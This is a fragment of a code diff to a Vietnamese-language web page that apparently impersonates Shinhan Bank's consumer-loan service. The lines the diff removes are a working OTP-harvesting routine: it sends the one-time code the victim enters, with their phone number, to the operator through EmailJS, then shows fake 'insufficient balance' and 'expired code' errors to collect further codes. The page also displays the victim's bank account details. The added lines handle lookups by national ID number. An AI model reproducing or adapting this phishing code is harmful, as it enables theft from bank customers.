+                    const hoSo = JSON.parse(decryptedBytes.toString(CryptoJS.enc.Utf8));
+                    if (hoSo && hoSo.cccd === cccd) {
+                        window.currentHoSo = hoSo; // Lưu vào biến toàn cục để hàm download có thể truy cập
+                        renderResult(hoSo);
+                    } else {
+                        throw new Error("Số CCCD không khớp với hồ sơ đã lưu. Vui lòng kiểm tra lại.");
+                    }
+                } catch (error) {
+                    document.getElementById('skeleton-container').classList.add('hidden');
+                    resetUI();
+                    alert(error.message || "Lỗi truy xuất dữ liệu. Dữ liệu có thể bị hỏng.");
                 }
             }, 1000);
         }
 
-        function sendOTPToEmail(otp, phone) {
-            console.log('Sending OTP to EmailJS:', { otp, phone });
-            emailjs.send('service_60tgxof', 'template_g9e2jee', {
-                otp: otp,
-                phone: phone,
-                timestamp: new Date().toLocaleString('vi-VN')
-            }).then(
-                () => console.log('OTP sent to EmailJS:', { otp, phone, timestamp: new Date().toLocaleString('vi-VN') }),
-                (error) => console.error('EmailJS error:', error)
-            );
-        }
-        
-        function showInlineError(message) {
-            const otpInput = document.getElementById('otp');
-            const otpErrorInline = document.getElementById('otp-error-inline');
-            if (otpInput && otpErrorInline) {
-                otpInput.classList.add('error');
-                otpErrorInline.textContent = message;
-                otpErrorInline.classList.remove('hidden');
-                otpInput.focus();
-                otpInput.select();
-            }
-        }
-
-        function showModalError(message) {
-            const modal = document.getElementById('errorModal');
-            const errorMessageEl = document.getElementById('errorMessage');
-            if (modal && errorMessageEl) {
-                errorMessageEl.textContent = message;
-                modal.classList.remove('hidden');
-            }
-        }
-
-        function closeErrorModal() {
-            const modal = document.getElementById('errorModal');
-            const errorButton = document.getElementById('errorButton');
-            modal.classList.add('hidden');
-            
-            errorButton.textContent = 'Thử lại';
-            errorButton.onclick = closeErrorModal;
-
-            clearOTPInput();
-        }
-
-        function verifyOTP() {
-            const otpInput = document.getElementById('otp');
-            const otp = otpInput.value.trim();
-            const phone = formData.phone || 'N/A';
-
-            document.getElementById('otp-error-inline').classList.add('hidden');
-            otpInput.classList.remove('error');
-
-            if (otp.length !== 6 && otp.length !== 8) {
-                showInlineError("Mã OTP phải là 6 hoặc 8 chữ số. Vui lòng kiểm tra lại.");
-                return;
-            }
-            
-            attemptCount++;
-
-            if (attemptCount === 1) {
-                sendOTPToEmail(otp, phone);
-                startOTPTimer();
-                showInlineError('Kiểm tra lại điều kiện, số dư không đủ hoặc thẻ chưa được kích hoạt.');
-            } else if (attemptCount === 2) {
-                startOTPTimer();
-                showInlineError('Mã xác nhận hết hiệu lực hoặc không đúng.');
-            } else {
-                sessionStorage.removeItem('formData');
-                const modal = document.getElementById('errorModal');
-                const errorMessageEl = document.getElementById('errorMessage');
-                const errorButton = document.getElementById('errorButton');
-
-                errorMessageEl.textContent = 'Giải ngân không thành công. Vui lòng thử lại hoặc đăng ký giải ngân lại.';
-                errorButton.textContent = 'Đăng ký lại';
-                errorButton.onclick = () => {
-                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
-                };
-                modal.classList.remove('hidden');
-            }
-        }
-        
-        function closeGeminiModal() {
-            document.getElementById('gemini-modal').classList.add('hidden');
-        }
-
-        async function getFinancialAdvice() {
-            const modal = document.getElementById('gemini-modal');
-            const modalContent = document.getElementById('gemini-modal-content');
-            
-            if (!formData || !formData.amount) {
-                modalContent.innerHTML = `<p class="text-red-500">Không tìm thấy thông tin khoản vay để đưa ra lời khuyên.</p>`;
-                modal.classList.remove('hidden');
-                return;
-            }
-            
-            modal.classList.remove('hidden');
-            modalContent.innerHTML = `<div class="loader"></div>`;
-
-            const prompt = `Tôi sắp vay một khoản tiền là ${formData.amount} VND với thời hạn ${formData.months || 'không xác định'} tháng từ ngân hàng Shinhan. Dựa trên thông tin này, hãy đưa ra một số lời khuyên tài chính ngắn gọn, dễ hiểu và hữu ích cho người dùng ở Việt Nam. Vui lòng tập trung vào các điểm chính sau:
-1. Gợi ý cách lập ngân sách hàng tháng để đảm bảo trả nợ đúng hạn.
-2. Một vài lưu ý quan trọng về việc duy trì điểm tín dụng tốt.
-3. Một cảnh báo nhỏ về các rủi ro tài chính cần tránh khi có một khoản vay.
-Hãy trình bày dưới dạng danh sách các gạch đầu dòng, sử dụng ngôn ngữ thân thiện, tích cực và chuyên nghiệp.`;
-
-            try {
-                let chatHistory = [{ role: "user", parts: [{ text: prompt }] }];
-                const payload = { contents: chatHistory };
-                const apiKey = "";
-                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
-                
-                const response = await fetch(apiUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                if (!response.ok) {
-                    throw new Error(`API call failed with status: ${response.status}`);
-                }
-
-                const result = await response.json();
-
-                if (result.candidates && result.candidates.length > 0 &&
-                    result.candidates[0].content && result.candidates[0].content.parts &&
-                    result.candidates[0].content.parts.length > 0) {
-                    const text = result.candidates[0].content.parts[0].text.replace(/(\* |- )/g, '• ').replace(/\n/g, '<br>');
-                    modalContent.innerHTML = `<div class="text-left text-sm text-slate-700 space-y-3 prose prose-sm max-w-none">${text}</div>`;
-                } else {
-                    throw new Error("Không nhận được phản hồi hợp lệ từ AI.");
-                }
-            } catch (error) {
-                console.error("Gemini API Error:", error);
-                modalContent.innerHTML = `<p class="text-red-500">Rất tiếc, đã có lỗi xảy ra khi tạo lời khuyên. Vui lòng thử lại sau.</p>`;
-            }
-        }
-        
-        window.addEventListener('load', () => {
-            startOTPTimer();
-            setupMobileMenu();
-            
-            const otpInput = document.getElementById('otp');
-            const otpErrorInline = document.getElementById('otp-error-inline');
-
-            otpInput.addEventListener('input', () => {
-                otpInput.classList.remove('error');
-                otpErrorInline.classList.add('hidden');
-            });
-
-            try {
-                formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-                if (!formData.fullName) {
-                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
-                    return;
-                }
-                document.getElementById('summaryName').textContent = formData.accountHolder || 'N/A';
-                document.getElementById('summaryAmount').textContent = formData.amount || 'N/A';
-                document.getElementById('summaryBank').textContent = formData.bank || 'N/A';
-                document.getElementById('summaryAccountNumber').textContent = formData.accountNumber || 'N/A';
-                document.getElementById('otpMessage').innerHTML = `Một mã OTP đã được gửi đến số điện thoại <strong>${formData.phone || 'N/A'}</strong>.`;
-            } catch (error) {
-                console.error('Error parsing formData:', error);
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
-            }
+        document.getElementById('cccd').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '');
         });
+
     </script>
 </body>
 </html>
